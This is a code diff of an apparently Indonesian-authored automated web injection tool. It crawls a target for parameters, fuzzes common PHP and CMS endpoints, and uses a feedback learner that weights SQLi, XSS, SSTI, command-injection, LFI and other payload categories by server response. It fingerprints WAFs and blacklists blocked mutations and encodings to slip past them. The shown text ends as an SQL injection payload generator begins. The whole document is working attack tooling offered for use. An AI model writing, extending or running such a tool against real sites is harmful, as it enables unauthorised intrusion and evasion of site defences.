             r'["\']([/a-zA-Z0-9_/-]+\?[a-zA-Z_][a-zA-Z0-9_]*=)["\']',
             r'fetch\s*$\s*["\']([^"\']+\?[^"\']+)["\']',
             r'\.ajax\s*$\s*\{[^}]*url:\s*["\']([^"\']+)["\']',
             r'axios\.[a-z]+\s*$\s*["\']([^"\']+)["\']',
-            r'XMLHttpRequest[^;]*open\s*$[^,]+,\s*["\']([^"\']+)["\']',
             r'window\.location\s*=\s*["\']([^"\']+\?[^"\']+)["\']',
-            r'location\.href\s*=\s*["\']([^"\']+\?[^"\']+)["\']',
-            r'document\.location\s*=\s*["\']([^"\']+\?[^"\']+)["\']',
             r'\.get\s*$\s*["\']([^"\']+\?[^"\']+)["\']',
             r'\.post\s*$\s*["\']([^"\']+\?[^"\']+)["\']',
-            r'href\s*:\s*["\']([^"\']+\?[^"\']+)["\']',
-            r'url\s*:\s*["\']([^"\']+\?[^"\']+)["\']',
         ]
-
-        for script in scripts:
-            for pattern in url_patterns:
-                for match in re.findall(pattern, script):
-                    full_url = urljoin(self.target, match)
-                    parsed = urlparse(full_url)
+        for s in scripts:
+            for pat in patterns:
+                for m in re.findall(pat, s):
+                    full = urljoin(self.target, m)
+                    parsed = urlparse(full)
                     if parsed.query:
-                        params = parse_qs(parsed.query)
-                        for name in params:
-                            self.parameters.append(Parameter(
-                                name=name,
-                                location="ajax",
-                                method="GET",
-                                url=full_url.split("?")[0],
-                                original_value=params[name][0] if params[name] else "",
-                                context={"source": "js_endpoint"}
-                            ))
+                        for name in parse_qs(parsed.query):
+                            self.parameters.append(Parameter(name=name, location="ajax",
+                                method="GET", url=full.split("?")[0],
+                                context={"source": "js_endpoint"}))
 
     def _deep_crawl_links(self, html: str):
-        """Crawl internal links 2 levels deep untuk temukan parameter."""
-        if not HAS_BS4:
-            return
-
-        # Level 1
+        if not HAS_BS4: return
         soup = BeautifulSoup(html, "html.parser")
-        links_l1 = set()
-        for link in soup.find_all("a", href=True):
-            href = link["href"]
-            full_url = urljoin(self.target, href)
-            parsed = urlparse(full_url)
-
-            # Only internal links, skip static files
-            if parsed.netloc == self.parsed.netloc:
-                skip_exts = ['.jpg', '.jpeg', '.png', '.gif', '.svg', '.webp',
-                            '.css', '.js', '.pdf', '.zip', '.ico', '.woff', '.woff2',
-                            '.ttf', '.eot', '.mp4', '.mp3', '.avi']
-                if not any(parsed.path.lower().endswith(ext) for ext in skip_exts):
-                    links_l1.add(full_url)
-                    self.discovered_urls.add(full_url)
-
-                    # Extract parameters from this link
-                    if parsed.query:
-                        params = parse_qs(parsed.query)
-                        for name, values in params.items():
-                            self.parameters.append(Parameter(
-                                name=name,
-                                location="url_query",
-                                method="GET",
-                                url=full_url.split("?")[0],
-                                original_value=values[0] if values else "",
-                                context={"source": "internal_link"}
-                            ))
-
-        print(f"      Level 1: Found {len(links_l1)} internal links")
-
-        # Level 2: Crawl up to 25 internal pages
-        crawled_l2 = 0
-        for link_url in list(links_l1)[:25]:
+        links = set()
+        skip = ['.jpg','.jpeg','.png','.gif','.svg','.webp','.css','.js','.pdf',
+                '.zip','.ico','.woff','.woff2','.ttf','.eot','.mp4','.mp3']
+        for a in soup.find_all("a", href=True):
+            full = urljoin(self.target, a["href"])
+            p = urlparse(full)
+            if p.netloc == self.parsed.netloc and not any(p.path.lower().endswith(e) for e in skip):
+                links.add(full)
+                self.discovered_urls.add(full)
+                if p.query:
+                    for name, vals in parse_qs(p.query).items():
+                        self.parameters.append(Parameter(name=name, location="url_query",
+                            method="GET", url=full.split("?")[0],
+                            original_value=vals[0] if vals else "",
+                            context={"source": "internal_link"}))
+        print(f"      Level 1: Found {len(links)} internal links")
+        crawled = 0
+        for url in list(links)[:25]:
             try:
-                page_html = self._fetch_page(link_url)
-                if not page_html:
-                    continue
-                crawled_l2 += 1
-
-                # Extract everything from subpages
-                self._extract_form_params(page_html)
-                self._extract_hidden_params(page_html)
-                self._extract_js_endpoints(page_html)
-
-                # Links with parameters from subpages
-                if HAS_BS4:
-                    sub_soup = BeautifulSoup(page_html, "html.parser")
-                    for sub_link in sub_soup.find_all("a", href=True):
-                        sub_href = sub_link["href"]
-                        sub_full = urljoin(link_url, sub_href)
-                        sub_parsed = urlparse(sub_full)
-
-                        if sub_parsed.netloc == self.parsed.netloc:
-                            self.discovered_urls.add(sub_full)
-                            if sub_parsed.query:
-                                params = parse_qs(sub_parsed.query)
-                                for name, values in params.items():
-                                    self.parameters.append(Parameter(
-                                        name=name,
-                                        location="url_query",
-                                        method="GET",
-                                        url=sub_full.split("?")[0],
-                                        original_value=values[0] if values else "",
-                                        context={"source": "deep_crawl_l2"}
-                                    ))
-
-                time.sleep(0.1)  # Rate limit
-            except Exception:
-                continue
-
-        print(f"      Level 2: Crawled {crawled_l2} pages, discovered {len(self.discovered_urls)} URLs total")
+                h = self._fetch_page(url)
+                if not h: continue
+                crawled += 1
+                self._extract_form_params(h)
+                self._extract_hidden_params(h)
+                self._extract_js_endpoints(h)
+                sub = BeautifulSoup(h, "html.parser")
+                for a in sub.find_all("a", href=True):
+                    sf = urljoin(url, a["href"])
+                    sp = urlparse(sf)
+                    if sp.netloc == self.parsed.netloc:
+                        self.discovered_urls.add(sf)
+                        if sp.query:
+                            for name, vals in parse_qs(sp.query).items():
+                                self.parameters.append(Parameter(name=name, location="url_query",
+                                    method="GET", url=sf.split("?")[0],
+                                    original_value=vals[0] if vals else "",
+                                    context={"source": "deep_crawl_l2"}))
+                time.sleep(0.1)
+            except: continue
+        print(f"      Level 2: Crawled {crawled} pages, {len(self.discovered_urls)} URLs total")
 
     def _scan_robots_sitemap(self):
-        """Scan robots.txt dan sitemap.xml untuk URL dengan parameter."""
-        # robots.txt
-        robots_url = f"{self.base_url}/robots.txt"
-        robots_content = self._fetch_page(robots_url)
-        robots_paths = []
-        if robots_content:
-            urls_from_robots = re.findall(r'(?:Disallow|Allow):\s*(/[^\s#]+)', robots_content)
-            for path in urls_from_robots[:40]:
-                full_url = urljoin(self.base_url, path)
-                parsed = urlparse(full_url)
-                if parsed.query:
-                    params = parse_qs(parsed.query)
-                    for name in params:
-                        self.parameters.append(Parameter(
-                            name=name, location="robots_txt", method="GET",
-                            url=full_url.split("?")[0],
-                            context={"source": "robots.txt"}
-                        ))
+        robots = self._fetch_page(f"{self.base_url}/robots.txt")
+        rpaths = []
+        if robots:
+            urls = re.findall(r'(?:Disallow|Allow):\s*(/[^\s#]+)', robots)
+            for path in urls[:40]:
+                full = urljoin(self.base_url, path)
+                p = urlparse(full)
+                if p.query:
+                    for name in parse_qs(p.query):
+                        self.parameters.append(Parameter(name=name, location="robots_txt",
+                            method="GET", url=full.split("?")[0], context={"source": "robots.txt"}))
                 else:
-                    # Store clean paths for fuzzing
-                    clean_url = full_url.rstrip("*").rstrip("$")
-                    if not any(c in clean_url for c in ['*', '$', '{', '}']):
-                        robots_paths.append(clean_url)
-                        self.discovered_urls.add(clean_url)
-            print(f"      robots.txt: Found {len(robots_paths)} paths, {len(urls_from_robots)} directives")
-
-        # sitemap.xml
-        sitemap_urls_to_check = [
-            f"{self.base_url}/sitemap.xml",
-            f"{self.base_url}/sitemap_index.xml",
-            f"{self.base_url}/sitemap1.xml",
-        ]
-
-        sitemap_found = 0
-        for sitemap_url in sitemap_urls_to_check:
-            sitemap_content = self._fetch_page(sitemap_url)
-            if sitemap_content:
-                sitemap_found += 1
-                urls_in_sitemap = re.findall(r'<loc>(.*?)</loc>', sitemap_content)
-
-                for url in urls_in_sitemap[:80]:
-                    parsed = urlparse(url)
-                    if parsed.query:
-                        params = parse_qs(parsed.query)
-                        for name, values in params.items():
-                            self.parameters.append(Parameter(
-                                name=name, location="sitemap", method="GET",
-                                url=url.split("?")[0],
-                                original_value=values[0] if values else "",
-                                context={"source": "sitemap.xml"}
-                            ))
+                    clean = full.rstrip("*").rstrip("$")
+                    if not any(c in clean for c in ['*','$','{','}']):
+                        rpaths.append(clean)
+                        self.discovered_urls.add(clean)
+        for surl in [f"{self.base_url}/sitemap.xml", f"{self.base_url}/sitemap_index.xml"]:
+            sc = self._fetch_page(surl)
+            if sc:
+                for u in re.findall(r'<loc>(.*?)</loc>', sc)[:80]:
+                    p = urlparse(u)
+                    if p.query:
+                        for name, vals in parse_qs(p.query).items():
+                            self.parameters.append(Parameter(name=name, location="sitemap",
+                                method="GET", url=u.split("?")[0],
+                                original_value=vals[0] if vals else "",
+                                context={"source": "sitemap"}))
                     else:
-                        self.discovered_urls.add(url)
-
-                # Check for sub-sitemaps
-                sub_sitemaps = [u for u in urls_in_sitemap if 'sitemap' in u.lower() and u.endswith('.xml')]
-                for sub_url in sub_sitemaps[:5]:
-                    sub_content = self._fetch_page(sub_url)
-                    if sub_content:
-                        sub_urls = re.findall(r'<loc>(.*?)</loc>', sub_content)
-                        for url in sub_urls[:50]:
-                            parsed = urlparse(url)
-                            if parsed.query:
-                                params = parse_qs(parsed.query)
-                                for name, values in params.items():
-                                    self.parameters.append(Parameter(
-                                        name=name, location="sitemap", method="GET",
-                                        url=url.split("?")[0],
-                                        original_value=values[0] if values else "",
-                                        context={"source": "sub_sitemap"}
-                                    ))
-                            else:
-                                self.discovered_urls.add(url)
-
-        if sitemap_found > 0:
-            print(f"      sitemap: Found {sitemap_found} sitemap(s), {len(self.discovered_urls)} URLs total")
+                        self.discovered_urls.add(u)
 
     def _fuzz_parameters(self):
-        """
-        KEY FEATURE: Bruteforce common parameters pada target URL dan discovered URLs.
-        Tes apakah server merespons berbeda ketika parameter diberi nilai.
-        """
-        # URLs to fuzz
-        urls_to_fuzz = set()
-        urls_to_fuzz.add(self.target.split("?")[0])
-        urls_to_fuzz.add(f"{self.base_url}/")
-        urls_to_fuzz.add(f"{self.base_url}/index.php")
-        urls_to_fuzz.add(f"{self.base_url}/index.html")
-
-        # Add discovered URLs (limit)
-        for url in list(self.discovered_urls)[:15]:
-            urls_to_fuzz.add(url.split("?")[0])
-
-        # Add robots paths
-        for url in list(self.discovered_urls)[:10]:
-            urls_to_fuzz.add(url.split("?")[0])
-
-        # Get baseline response for each URL
+        urls = set()
+        urls.add(self.target.split("?")[0])
+        urls.add(f"{self.base_url}/")
+        urls.add(f"{self.base_url}/index.php")
+        for u in list(self.discovered_urls)[:15]:
+            urls.add(u.split("?")[0])
         baselines = {}
-        for url in list(urls_to_fuzz)[:15]:
-            try:
-                result = self._fetch_page_allow_visited(url)
-                if result and result[0]:
-                    baselines[url] = {
-                        "text": result[0],
-                        "status": result[1],
-                        "size": result[2],
-                    }
-            except Exception:
-                continue
+        for u in list(urls)[:15]:
+            r = self._fetch_page_raw(u)
+            if r and r[0]:
+                baselines[u] = {"text": r[0], "status": r[1], "size": r[2]}
             time.sleep(0.05)
-
-        found_count = 0
-        tested = 0
-        params_to_test = self.COMMON_PARAMS[:50]
-
+        found = 0; tested = 0
+        params = self.COMMON_PARAMS[:50]
         for url in list(baselines.keys())[:15]:
-            baseline = baselines[url]
-            base_text = baseline["text"]
-            base_size = baseline["size"]
-            base_status = baseline["status"]
-
-            for param_name in params_to_test:
+            bl = baselines[url]
+            for pn in params:
                 tested += 1
-                test_url = f"{url}{'&' if '?' in url else '?'}{param_name}=1"
-
+                tu = f"{url}{'&' if '?' in url else '?'}{pn}=1"
                 try:
-                    result = self._fetch_page_allow_visited(test_url)
-                    if not result or not result[0]:
-                        continue
-
-                    resp_text, status, resp_size = result
-
-                    # Analysis: does the parameter affect the response?
-                    is_active = False
-                    reason = ""
-
-                    # 1. Status code changed
-                    if status != base_status and status == 200:
-                        is_active = True
-                        reason = f"status changed {base_status}→{status}"
-
-                    # 2. Response size differs significantly
-                    if base_size > 0:
-                        size_diff = abs(resp_size - base_size)
-                        size_diff_pct = (size_diff / base_size) * 100
-                        if size_diff_pct > 5 and size_diff > 100:
-                            is_active = True
-                            reason = f"size diff {size_diff_pct:.1f}% ({base_size}→{resp_size})"
-
-                    # 3. Error indicators in response (parameter exists but invalid value)
-                    error_indicators = [
-                        "error", "invalid", "not found", "undefined",
-                        "syntax", "warning", "notice", "exception",
-                        "mysql", "sql", "query", "database",
-                        "required", "missing", "expected",
-                        "tidak ditemukan", "tidak valid",
-                    ]
-                    resp_lower = resp_text.lower()
-                    for indicator in error_indicators:
-                        if indicator in resp_lower and indicator not in base_text.lower():
-                            is_active = True
-                            reason = f"error indicator: '{indicator}'"
-                            break
-
-                    if is_active:
-                        already = any(p.name == param_name and p.url == url for p in self.parameters)
-                        if not already:
-                            self.parameters.append(Parameter(
-                                name=param_name, location="fuzzed", method="GET",
-                                url=url, original_value="1",
-                                context={
-                                    "source": "parameter_fuzzing",
-                                    "reason": reason,
-                                    "status": status,
-                                    "resp_size": resp_size,
-                                }
-                            ))
-                            found_count += 1
-                            print(f"      \033[32m[+]\033[0m Fuzzed: \033[37m{param_name}\033[0m on {url[:50]} → {reason}")
-
-                    time.sleep(0.03)  # Rate limit
-
-                except Exception:
-                    continue
-
-        print(f"      Tested {tested} combinations, found \033[32m{found_count}\033[0m active parameters")
+                    r = self._fetch_page_raw(tu)
+                    if not r or not r[0]: continue
+                    rt, rs, rz = r
+                    active = False; reason = ""
+                    if rs != bl["status"] and rs == 200:
+                        active = True; reason = f"status {bl['status']}→{rs}"
+                    if bl["size"] > 0:
+                        diff = abs(rz - bl["size"])
+                        pct = (diff / bl["size"]) * 100
+                        if pct > 5 and diff > 100:
+                            active = True; reason = f"size diff {pct:.1f}%"
+                    errors = ["error","invalid","not found","undefined","syntax","warning",
+                             "notice","exception","mysql","sql","query","database","required","missing"]
+                    rl = rt.lower(); btl = bl["text"].lower()
+                    for e in errors:
+                        if e in rl and e not in btl:
+                            active = True; reason = f"error: '{e}'"; break
+                    if active:
+                        if not any(p.name == pn and p.url == url for p in self.parameters):
+                            self.parameters.append(Parameter(name=pn, location="fuzzed",
+                                method="GET", url=url, original_value="1",
+                                context={"source": "fuzzing", "reason": reason, "status": rs}))
+                            found += 1
+                            print(f"      \033[32m[+]\033[0m Fuzzed: \033[37m{pn}\033[0m → {reason}")
+                    time.sleep(0.03)
+                except: continue
+        print(f"      Tested {tested}, found \033[32m{found}\033[0m active params")
 
     def _scan_common_endpoints(self):
-        """Scan common PHP/CMS/ framework endpoints."""
-        endpoints_with_params = [
-            ("/index.php", ["id", "page", "cat", "action", "view", "mod", "option"]),
-            ("/index.html", ["id", "page"]),
-            ("/article.php", ["id", "id_artikel", "slug", "title"]),
-            ("/post.php", ["id", "id_post", "slug", "p"]),
-            ("/news.php", ["id", "id_news", "id_berita", "cat"]),
-            ("/detail.php", ["id", "id_item", "item"]),
-            ("/read.php", ["id", "slug", "page"]),
-            ("/view.php", ["id", "item", "type"]),
-            ("/show.php", ["id", "item", "type"]),
-            ("/search.php", ["q", "search", "keyword", "s", "query"]),
-            ("/category.php", ["id", "cat", "cid", "category"]),
-            ("/product.php", ["id", "pid", "sku", "product"]),
-            ("/profile.php", ["id", "uid", "user", "username"]),
-            ("/download.php", ["file", "id", "path", "doc"]),
-            ("/page.php", ["id", "page", "p", "pg"]),
-            ("/berita.php", ["id", "id_berita", "hal"]),
-            ("/artikel.php", ["id", "id_artikel", "hal"]),
-            ("/komentar.php", ["id", "post_id", "article_id"]),
-            ("/gallery.php", ["id", "album", "cat"]),
-            ("/cart.php", ["id", "product_id", "action"]),
-            ("/api/search", ["q", "query", "keyword", "term"]),
-            ("/api/v1/search", ["q", "query", "keyword"]),
-            ("/wp-admin/admin-ajax.php", ["action", "id"]),
+        eps = [
+            ("/index.php", ["id","page","cat","action","view","mod"]),
+            ("/article.php", ["id","id_artikel","slug"]),
+            ("/post.php", ["id","id_post","slug"]),
+            ("/news.php", ["id","id_news","id_berita"]),
+            ("/detail.php", ["id","id_item"]),
+            ("/read.php", ["id","slug"]),
+            ("/search.php", ["q","search","keyword","s"]),
+            ("/category.php", ["id","cat","cid"]),
+            ("/product.php", ["id","pid","sku"]),
+            ("/profile.php", ["id","uid","user"]),
+            ("/download.php", ["file","id","path"]),
+            ("/page.php", ["id","page","p"]),
+            ("/berita.php", ["id","id_berita"]),
+            ("/artikel.php", ["id","id_artikel"]),
+            ("/api/search", ["q","query","keyword"]),
         ]
-
-        found_endpoints = 0
-        for path, params in endpoints_with_params:
-            endpoint_url = f"{self.base_url}{path}"
+        found = 0
+        for path, params in eps:
+            eu = f"{self.base_url}{path}"
             try:
-                result = self._fetch_page_allow_visited(endpoint_url)
-                if result and result[0] and result[1] < 400:
-                    found_endpoints += 1
-                    for param_name in params:
-                        already = any(p.name == param_name and p.url == endpoint_url for p in self.parameters)
-                        if not already:
-                            self.parameters.append(Parameter(
-                                name=param_name, location="endpoint", method="GET",
-                                url=endpoint_url, original_value="",
-                                context={"source": "common_endpoint", "endpoint_status": result[1]}
-                            ))
-                    print(f"      \033[32m[+]\033[0m Endpoint: {path} (params: {', '.join(params[:4])})")
-
+                r = self._fetch_page_raw(eu)
+                if r and r[0] and r[1] < 400:
+                    found += 1
+                    for pn in params:
+                        if not any(p.name == pn and p.url == eu for p in self.parameters):
+                            self.parameters.append(Parameter(name=pn, location="endpoint",
+                                method="GET", url=eu, context={"source": "endpoint"}))
+                    print(f"      \033[32m[+]\033[0m Endpoint: {path} ({', '.join(params[:3])})")
                 time.sleep(0.05)
-            except Exception:
-                continue
-
-        print(f"      Found {found_endpoints} active endpoints")
+            except: continue
+        print(f"      Found {found} active endpoints")
 
     def _detect_path_params(self):
-        """Detect path-based parameters like /post/123 or /news/read/slug."""
-        urls_to_check = list(self.discovered_urls)[:30]
-        urls_to_check.append(self.target)
-
-        path_patterns = [
-            (r'/(\d+)$', 'id', 'numeric_path'),
-            (r'/([a-z0-9-]+)$', 'slug', 'slug_path'),
-            (r'/read/(\d+)', 'id', 'read_numeric'),
-            (r'/read/([a-z0-9-]+)', 'slug', 'read_slug'),
-            (r'/detail/(\d+)', 'id', 'detail_numeric'),
-            (r'/detail/([a-z0-9-]+)', 'slug', 'detail_slug'),
-            (r'/post/(\d+)', 'id', 'post_numeric'),
-            (r'/post/([a-z0-9-]+)', 'slug', 'post_slug'),
-            (r'/article/(\d+)', 'id', 'article_numeric'),
-            (r'/article/([a-z0-9-]+)', 'slug', 'article_slug'),
-            (r'/berita/(\d+)', 'id', 'berita_numeric'),
-            (r'/berita/([a-z0-9-]+)', 'slug', 'berita_slug'),
-            (r'/artikel/(\d+)', 'id', 'artikel_numeric'),
-            (r'/artikel/([a-z0-9-]+)', 'slug', 'artikel_slug'),
-            (r'/category/([^/]+)', 'cat', 'category_path'),
-            (r'/tag/([^/]+)', 'tag', 'tag_path'),
-            (r'/user/([^/]+)', 'user', 'user_path'),
-            (r'/p/(\d+)', 'page', 'page_path'),
-            (r'/product/(\d+)', 'id', 'product_numeric'),
-            (r'/product/([a-z0-9-]+)', 'slug', 'product_slug'),
+        urls = list(self.discovered_urls)[:30] + [self.target]
+        patterns = [
+            (r'/(\d+)$', 'id'), (r'/([a-z0-9-]+)$', 'slug'),
+            (r'/read/(\d+)', 'id'), (r'/read/([a-z0-9-]+)', 'slug'),
+            (r'/detail/(\d+)', 'id'), (r'/post/(\d+)', 'id'),
+            (r'/article/(\d+)', 'id'), (r'/berita/(\d+)', 'id'),
+            (r'/artikel/(\d+)', 'id'), (r'/category/([^/]+)', 'cat'),
+            (r'/tag/([^/]+)', 'tag'), (r'/user/([^/]+)', 'user'),
         ]
-
-        found_paths = 0
-        for url in urls_to_check:
-            parsed = urlparse(url)
-            path = parsed.path
-
-            for pattern, param_name, context_type in path_patterns:
-                match = re.search(pattern, path, re.I)
-                if match:
-                    already = any(p.name == param_name and p.location == "path" and p.url == url for p in self.parameters)
-                    if not already:
-                        self.parameters.append(Parameter(
-                            name=param_name, location="path", method="GET",
-                            url=url, original_value=match.group(1),
-                            context={"source": "path_detection", "type": context_type}
-                        ))
-                        found_paths += 1
+        found = 0
+        for url in urls:
+            path = urlparse(url).path
+            for pat, pn in patterns:
+                m = re.search(pat, path, re.I)
+                if m:
+                    if not any(p.name == pn and p.location == "path" and p.url == url for p in self.parameters):
+                        self.parameters.append(Parameter(name=pn, location="path",
+                            method="GET", url=url, original_value=m.group(1),
+                            context={"source": "path_detection"}))
+                        found += 1
                     break
-
-        if found_paths > 0:
-            print(f"      Found {found_paths} path-based parameters")
+        if found: print(f"      Found {found} path-based parameters")
 
 
 # ============================================================
-# FEEDBACK LEARNER — ML learns from every server response
+# FEEDBACK LEARNER (Enhanced with Negative Selection)
 # ============================================================
 class FeedbackLearner:
-    """
-    ML component yang belajar dari setiap feedback server.
-    Menyesuaikan strategi payload berdasarkan respon.
-    """
-
     def __init__(self):
         self.category_scores = defaultdict(lambda: {"success": 0, "fail": 0, "raw_html": 0, "blocked": 0})
         self.encoding_scores = defaultdict(lambda: {"success": 0, "fail": 0})
@@ -1050,23 +1996,27 @@ class FeedbackLearner:
         self.response_times = []
         self.baseline_response_time = 0
         self.category_weights = {
-            "sqli": 0.35, "xss": 0.25, "ssti": 0.15,
+            "sqli": 0.30, "xss": 0.25, "ssti": 0.15,
             "cmdi": 0.10, "lfi": 0.10, "xxe": 0.02,
-            "crlf": 0.02, "redirect": 0.01
+            "crlf": 0.02, "redirect": 0.01, "polyglot": 0.05
         }
         self.lr = 0.15
         self.history = []
+        # Negative selection
+        self.blocked_mutations = set()
+        self.mutation_fail_count = defaultdict(int)
+        self.blocked_encodings = set()
+        self.encoding_fail_count = defaultdict(int)
 
-    def record_feedback(self, payload_dict: Dict, result: 'InjectionResult'):
-        """Record feedback dari satu injection attempt."""
+    def record_feedback(self, payload_dict: Dict, result):
         cat = payload_dict.get("category", "unknown")
         encoding = payload_dict.get("encoding", "raw")
         tier = payload_dict.get("length_tier", "short")
         strategy = payload_dict.get("strategy", "unknown")
+        mutations = payload_dict.get("mutation_history", [])
         resp_type = result.response_type
         status = result.status_code
         resp_time = result.response_time_ms
-        resp_text = result.evidence
 
         if resp_time > 0:
             self.response_times.append(resp_time)
@@ -1080,8 +2030,9 @@ class FeedbackLearner:
             self.strategy_scores[strategy]["success"] += 1
             self.successful_patterns.append({
                 "category": cat, "encoding": encoding, "tier": tier,
-                "strategy": strategy, "payload": payload_dict.get("payload", "")[:100],
-                "evidence": resp_text[:100]
+                "strategy": strategy, "mutations": mutations,
+                "payload": payload_dict.get("payload", "")[:100],
+                "evidence": result.evidence[:100]
             })
         elif resp_type == "raw_html":
             self.category_scores[cat]["raw_html"] += 1
@@ -1090,264 +2041,201 @@ class FeedbackLearner:
             self.category_scores[cat]["blocked"] += 1
             self.blocked_patterns.append({
                 "category": cat, "encoding": encoding,
+                "mutations": mutations,
                 "payload_snippet": payload_dict.get("payload", "")[:50],
                 "status": status
             })
-            self._detect_waf(resp_text, status)
+            self._detect_waf(result.evidence, status)
 
-        self._detect_tech(resp_text, status)
+            # NEGATIVE SELECTION: blacklist failed mutations
+            for mut in mutations:
+                self.mutation_fail_count[mut] += 1
+                if self.mutation_fail_count[mut] >= 3:
+                    self.blocked_mutations.add(mut)
+            self.encoding_fail_count[encoding] += 1
+            if self.encoding_fail_count[encoding] >= 5:
+                self.blocked_encodings.add(encoding)
+
+        self._detect_tech(result.evidence, status)
         self._adjust_weights()
-
         self.history.append({
             "category": cat, "encoding": encoding, "tier": tier,
+            "strategy": strategy, "mutations": mutations,
             "response_type": resp_type, "status": status,
             "response_time": resp_time
         })
 
     def _detect_waf(self, evidence: str, status: int):
-        waf_signs = {
-            "cloudflare": ["cloudflare", "cf-ray", "attention required"],
-            "modsecurity": ["mod_security", "not acceptable", "406"],
-            "incapsula": ["incapsula", "imperva"],
-            "sucuri": ["sucuri", "cloudproxy"],
-            "akamai": ["akamai", "reference"],
-            "aws_waf": ["aws", "waf", "captcha"],
-            "f5": ["f5 networks", "big-ip"],
+        signs = {
+            "cloudflare": ["cloudflare","cf-ray","attention required"],
+            "modsecurity": ["mod_security","not acceptable","406"],
+            "incapsula": ["incapsula","imperva"],
+            "sucuri": ["sucuri","cloudproxy"],
+            "akamai": ["akamai","reference"],
+            "aws_waf": ["aws","waf","captcha"],
+            "f5": ["f5 networks","big-ip"],
         }
-        evidence_lower = evidence.lower()
-        for waf_name, signs in waf_signs.items():
-            for sign in signs:
-                if sign in evidence_lower:
+        el = evidence.lower()
+        for name, s in signs.items():
+            for sig in s:
+                if sig in el:
                     self.waf_detected = True
-                    self.waf_type = waf_name
-                    self.waf_signatures.append(sign)
+                    self.waf_type = name
+                    self.waf_signatures.append(sig)
         if status in [403, 406, 429, 503]:
             self.waf_detected = True
 
     def _detect_tech(self, evidence: str, status: int):
         el = evidence.lower()
         if "php" in el or "laravel" in el: self.server_tech["language"] = "PHP"
-        elif "python" in el or "django" in el or "flask" in el: self.server_tech["language"] = "Python"
+        elif "python" in el or "django" in el: self.server_tech["language"] = "Python"
         elif "java" in el or "spring" in el: self.server_tech["language"] = "Java"
         elif "asp.net" in el or ".net" in el: self.server_tech["language"] = "ASP.NET"
         elif "node" in el or "express" in el: self.server_tech["language"] = "Node.js"
-        elif "ruby" in el or "rails" in el: self.server_tech["language"] = "Ruby"
-
         if "mysql" in el: self.server_tech["database"] = "MySQL"
-        elif "postgresql" in el or "psql" in el: self.server_tech["database"] = "PostgreSQL"
+        elif "postgresql" in el: self.server_tech["database"] = "PostgreSQL"
         elif "oracle" in el or "ora-" in el: self.server_tech["database"] = "Oracle"
         elif "sqlite" in el: self.server_tech["database"] = "SQLite"
-        elif "sql server" in el or "mssql" in el: self.server_tech["database"] = "MSSQL"
-
         if "django" in el: self.server_tech["framework"] = "Django"
-        elif "flask" in el or "werkzeug" in el: self.server_tech["framework"] = "Flask"
+        elif "flask" in el: self.server_tech["framework"] = "Flask"
         elif "spring" in el: self.server_tech["framework"] = "Spring"
         elif "laravel" in el: self.server_tech["framework"] = "Laravel"
-        elif "express" in el: self.server_tech["framework"] = "Express"
-        elif "rails" in el: self.server_tech["framework"] = "Rails"
 
     def _adjust_weights(self):
-        total_success = sum(v["success"] for v in self.category_scores.values())
-        if total_success == 0:
-            return
+        total = sum(v["success"] for v in self.category_scores.values())
+        if total == 0: return
         for cat, scores in self.category_scores.items():
             if cat in self.category_weights:
-                total = scores["success"] + scores["fail"] + scores["raw_html"] + scores["blocked"]
-                success_rate = scores["success"] / max(1, total)
-                if success_rate > 0.3:
-                    self.category_weights[cat] += self.lr * success_rate
+                t = scores["success"] + scores["fail"] + scores["raw_html"] + scores["blocked"]
+                sr = scores["success"] / max(1, t)
+                if sr > 0.3:
+                    self.category_weights[cat] += self.lr * sr
                 elif scores["blocked"] > scores["success"] * 3:
                     self.category_weights[cat] *= 0.8
-        total = sum(self.category_weights.values())
-        if total > 0:
+        s = sum(self.category_weights.values())
+        if s > 0:
             for cat in self.category_weights:
-                self.category_weights[cat] /= total
-
-    def get_best_category(self) -> str:
-        if not self.category_scores:
-            return random.choice(list(self.category_weights.keys()))
-        return max(
-            self.category_scores.keys(),
-            key=lambda c: self.category_scores[c]["success"],
-            default=random.choice(list(self.category_weights.keys()))
-        )
-
-    def get_best_encoding(self) -> str:
-        if not self.encoding_scores:
-            return "raw"
-        return max(
-            self.encoding_scores.keys(),
-            key=lambda e: self.encoding_scores[e]["success"],
-            default="raw"
-        )
-
-    def get_best_tier(self) -> str:
-        if not self.tier_scores:
-            return "short"
-        return max(
-            self.tier_scores.keys(),
-            key=lambda t: self.tier_scores[t]["success"],
-            default="short"
-        )
+                self.category_weights[cat] /= s
 
     def get_adaptive_weights(self) -> List[float]:
-        cats = ["sqli", "xss", "ssti", "cmdi", "lfi", "xxe", "crlf", "redirect"]
+        cats = ["sqli","xss","ssti","cmdi","lfi","xxe","crlf","redirect","polyglot"]
         return [self.category_weights.get(c, 0.01) for c in cats]
-
-    def should_evolve(self) -> bool:
-        if len(self.history) < 20:
-            return False
-        recent = self.history[-20:]
-        blocked_count = sum(1 for h in recent if h["response_type"] == "blocked")
-        return blocked_count > 10
 
     def get_learning_summary(self) -> str:
         lines = []
         if self.server_tech["language"]: lines.append(f"Server: {self.server_tech['language']}")
-        if self.server_tech["framework"]: lines.append(f"Framework: {self.server_tech['framework']}")
+        if self.server_tech["framework"]: lines.append(f"FW: {self.server_tech['framework']}")
         if self.server_tech["database"]: lines.append(f"DB: {self.server_tech['database']}")
         if self.waf_detected: lines.append(f"WAF: {self.waf_type or 'Detected'}")
+        if self.blocked_mutations:
+            lines.append(f"Blacklisted: {len(self.blocked_mutations)} muts")
         if self.successful_patterns:
-            best = self.get_best_category()
-            lines.append(f"Best: {best}")
+            best = max(self.category_scores.keys(),
+                      key=lambda c: self.category_scores[c]["success"], default="")
+            if best: lines.append(f"Best: {best}")
         return " | ".join(lines) if lines else "Learning..."
 
 
 # ============================================================
-# ML PAYLOAD GENERATOR v4.0 — ULTIMATE
+# ML PAYLOAD GENERATOR v5.0 (ALL v4.0 features + Grammar + Polyglot)
 # ============================================================
 class MLPayloadGenerator:
-    """
-    ML-driven payload generator ULTIMATE.
-    - 17+ SQLi strategies
-    - 24+ XSS strategies
-    - 18+ SSTI strategies
-    - 16+ CMDi strategies
-    - 16+ LFI strategies
-    - 5 XXE strategies
-    - 5 CRLF strategies
-    - 8 Redirect strategies
-    - 20 mutation techniques
-    - 7+ encoding functions
-    - Feedback learning integration
-    """
-
     ATOMS = {
-        "sql_string_break": ["'", '"', "`", "''", '""', "\\'", '\\"', "%27", "%22"],
-        "sql_logic": ["OR", "AND", "XOR", "NOT", "&&", "||", "DIV"],
-        "sql_comment": ["--", "#", "/**/", ";--", ";#", "-- -", "/*!*/", "--+", "%23"],
-        "sql_keyword": ["SELECT", "UNION", "FROM", "WHERE", "SLEEP", "BENCHMARK",
-                        "WAITFOR", "DELAY", "ORDER", "GROUP", "HAVING", "LIMIT",
